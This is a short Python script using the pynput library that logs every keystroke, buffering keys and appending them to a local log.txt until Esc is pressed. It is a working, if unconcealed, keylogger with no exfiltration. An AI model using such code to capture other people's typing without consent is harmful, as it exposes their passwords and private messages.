from pynput.keyboard import Key, Listener
from datetime import datetime

count = 0
keys = []


def on_press(key):
    global keys, count
    if str(key).find('backspace') > 0 and count > 0:
      keys.pop()
      count -= 1
    else:
      keys.append(key)
      count += 1
    print("{0} pressed".format(key))
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open('log.txt', 'a') as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(' ')
            elif k.find("enter") > 0:
                file.write("\n")
            elif k == 'EOF':
                dt_string = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
                file.write("\n-----PROGRAM TERMINATED {0}-----\n".format(dt_string))
            elif k.find("Key") == -1:
                file.write(str(k))

def on_release(key):
    global keys, count
    if key == Key.esc:
        keys.append('EOF')
        count += 1
        if count > 0:
          write_file(keys)
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
